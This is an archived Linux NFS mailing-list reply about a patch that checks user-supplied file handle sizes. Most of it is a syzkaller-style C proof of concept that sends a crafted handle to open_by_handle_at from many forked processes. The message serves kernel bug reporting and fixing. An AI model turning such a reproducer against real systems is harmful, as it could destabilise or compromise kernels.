Return-Path: <linux-nfs+bounces-12742-lists+linux-nfs=lfdr.de@vger.kernel.org>
X-Original-To: lists+linux-nfs@lfdr.de
Delivered-To: lists+linux-nfs@lfdr.de
Received: from am.mirrors.kernel.org (am.mirrors.kernel.org [147.75.80.249])
	by mail.lfdr.de (Postfix) with ESMTPS id 27108AE7845
	for <lists+linux-nfs@lfdr.de>; Wed, 25 Jun 2025 09:16:48 +0200 (CEST)
Received: from smtp.subspace.kernel.org (relay.kernel.org [52.25.139.140])
	(using TLSv1.2 with cipher ECDHE-ECDSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by am.mirrors.kernel.org (Postfix) with ESMTPS id D8ED31BC4FD2
	for <lists+linux-nfs@lfdr.de>; Wed, 25 Jun 2025 07:15:43 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id 41A082045AD;
	Wed, 25 Jun 2025 07:12:47 +0000 (UTC)
X-Original-To: linux-nfs@vger.kernel.org
Received: from szxga06-in.huawei.com (szxga06-in.huawei.com [45.249.212.32])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 8EC9820B80C
	for <linux-nfs@vger.kernel.org>; Wed, 25 Jun 2025 07:12:44 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=45.249.212.32
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1750835567; cv=none; b=giT8i4X1Sk2Df8jqYYuKZrF7CidwUXTndiFh+05JAU+Zxjl/BxT4gIfZsQr8thNQpv1YN+l7V2dCbGorQdzbZObnQPZm3F31KoePwTVwrixnvmwnnXGdUeBYu/57W46ts4lW89f4CbBSmn9pTVv+AtYbnUA3pHThDMl4H/TvhS0=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1750835567; c=relaxed/simple;
	bh=+Vpou+kB86ycjhwtaLDR4YWBbxFsPwiwHMYYc0wipLo=;
	h=From:To:CC:Subject:Date:Message-ID:In-Reply-To:References:
	 MIME-Version:Content-Type; b=aZ1q1R9Idjxhfiv3KC4qogFsJRnnj4hEVIFfukJcSynNUQjWDFw1oeuVbVoUrSSuaG83FttwSvgbwTl+ak9gHkhqWWtn43F0wp+tRlRgupQsoTeUVLCMyD3suJbAH+QNtptGeKbD/u+FVwAgKhfPw8AspCr9pkMfcJvczifWyjY=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=huawei.com; spf=pass smtp.mailfrom=huawei.com; arc=none smtp.client-ip=45.249.212.32
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=huawei.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=huawei.com
Received: from mail.maildlp.com (unknown [172.19.88.214])
	by szxga06-in.huawei.com (SkyGuard) with ESMTP id 4bRtMh6wMxz2QVHQ;
	Wed, 25 Jun 2025 15:13:36 +0800 (CST)
Received: from kwepemp200004.china.huawei.com (unknown [7.202.195.99])
	by mail.maildlp.com (Postfix) with ESMTPS id CAC1C1A016C;
	Wed, 25 Jun 2025 15:12:41 +0800 (CST)
Received: from huawei.com (10.175.124.27) by kwepemp200004.china.huawei.com
 (7.202.195.99) with Microsoft SMTP Server (version=TLS1_2,
 cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.2.1544.11; Wed, 25 Jun
 2025 15:12:40 +0800
From: zhangjian <zhangjian496@huawei.com>
To: <zhangjian496@huawei.com>
CC: <chuck.lever@oracle.com>, <djwong@kernel.org>, <jlayton@kernel.org>,
	<joannelkoong@gmail.com>, <kernel-team@meta.com>,
	<linux-nfs@vger.kernel.org>, <okorniev@redhat.com>, <steved@redhat.com>
Subject: Re: [PATCH] nfs:check for user input filehandle size
Date: Thu, 26 Jun 2025 08:26:13 +0800
Message-ID: <20250626002613.164312-1-zhangjian496@huawei.com>
X-Mailer: git-send-email 2.33.0
In-Reply-To: <20250626002026.110999-1-zhangjian496@huawei.com>
References: <20250626002026.110999-1-zhangjian496@huawei.com>
Precedence: bulk
X-Mailing-List: linux-nfs@vger.kernel.org
List-Id: <linux-nfs.vger.kernel.org>
List-Subscribe: <mailto:linux-nfs+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-nfs+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit
Content-Type: text/plain
X-ClientProxiedBy: kwepems100002.china.huawei.com (7.221.188.206) To
 kwepemp200004.china.huawei.com (7.202.195.99)

I am not sure if it is really a problem, since this memory is readonly 
and fails the check below (fh_len < len || fh_type != len). 

Which for advices.

The POC is as below:

#include <dirent.h>
#include <endian.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/prctl.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

static unsigned long long procid;

static void sleep_ms(uint64_t ms)
{
    usleep(ms * 1000);
}

static uint64_t current_time_ms(void)
{
    struct timespec ts;
    if (clock_gettime(CLOCK_MONOTONIC, &ts))
    exit(1);
    return (uint64_t)ts.tv_sec * 1000 + (uint64_t)ts.tv_nsec / 1000000;
}

static bool write_file(const char* file, const char* what, ...)
{
    char buf[1024];
    va_list args;
    va_start(args, what);
    vsnprintf(buf, sizeof(buf), what, args);
    va_end(args);
    buf[sizeof(buf) - 1] = 0;
    int len = strlen(buf);
    int fd = open(file, O_WRONLY | O_CLOEXEC);
    if (fd == -1)
        return false;
    if (write(fd, buf, len) != len) {
        int err = errno;
        close(fd);
        errno = err;
        return false;
    }
    close(fd);
    return true;
}

static void kill_and_wait(int pid, int* status)
{
    kill(-pid, SIGKILL);
    kill(pid, SIGKILL);
    for (int i = 0; i < 100; i++) {
        if (waitpid(-1, status, WNOHANG | __WALL) == pid)
            return;
        usleep(1000);
    }
    DIR* dir = opendir("/sys/fs/fuse/connections");
    if (dir) {
        for (;;) {
            struct dirent* ent = readdir(dir);
            if (!ent)
                break;
            if (strcmp(ent->d_name, ".") == 0 || strcmp(ent->d_name, "..") == 0)
                continue;
            char abort[300];
            snprintf(abort, sizeof(abort), "/sys/fs/fuse/connections/%s/abort", ent->d_name);
            int fd = open(abort, O_WRONLY);
            if (fd == -1) {
                continue;
            }
            if (write(fd, abort, 1) < 0) {
            }
            close(fd);
        }
        closedir(dir);
    } else {
    }
    while (waitpid(-1, status, __WALL) != pid) {
    }
}

static void setup_test()
{
    prctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0);
    setpgrp();
    write_file("/proc/self/oom_score_adj", "1000");
}

static void execute_one(void);

#define WAIT_FLAGS __WALL

static void loop(void)
{
    int iter = 0;
    for (;; iter++) {
        int pid = fork();
        if (pid < 0)
    exit(1);
        if (pid == 0) {
            setup_test();
            execute_one();
            exit(0);
        }
        int status = 0;
        uint64_t start = current_time_ms();
        for (;;) {
            if (waitpid(-1, &status, WNOHANG | WAIT_FLAGS) == pid)
                break;
            sleep_ms(1);
            if (current_time_ms() - start < 5000)
                continue;
            kill_and_wait(pid, &status);
            break;
        }
    }
}

uint64_t r[1] = {0xffffffffffffffff};

void execute_one(void)
{
        intptr_t res = 0;
memcpy((void*)0x200001c0, "/mnt/cachefilesd/test/1\000", 24);
    res = syscall(__NR_openat, /*fd=*/0xffffffffffffff9cul, /*file=*/0x200001c0ul, /*flags=*/0ul, /*mode=*/0ul);
    if (res != -1)
        r[0] = res;
*(uint32_t*)0x20000000 = 0xc;
*(uint32_t*)0x20000004 = 1;
*(uint32_t*)0x20000008 = 0xc6;
*(uint64_t*)0x2000000c = 0;
    syscall(__NR_open_by_handle_at, /*mountdirfd=*/r[0], /*handle=*/0x20000000ul, /*flags=*/0ul);

}
int main(void)
{
        syscall(__NR_mmap, /*addr=*/0x1ffff000ul, /*len=*/0x1000ul, /*prot=*/0ul, /*flags=*/0x32ul, /*fd=*/-1, /*offset=*/0ul);
    syscall(__NR_mmap, /*addr=*/0x20000000ul, /*len=*/0x1000000ul, /*prot=*/7ul, /*flags=*/0x32ul, /*fd=*/-1, /*offset=*/0ul);
    syscall(__NR_mmap, /*addr=*/0x21000000ul, /*len=*/0x1000ul, /*prot=*/0ul, /*flags=*/0x32ul, /*fd=*/-1, /*offset=*/0ul);
    for (procid = 0; procid < 10; procid++) {
        if (fork() == 0) {
            loop();
        }
    }
    sleep(1000000);
    return 0;
}

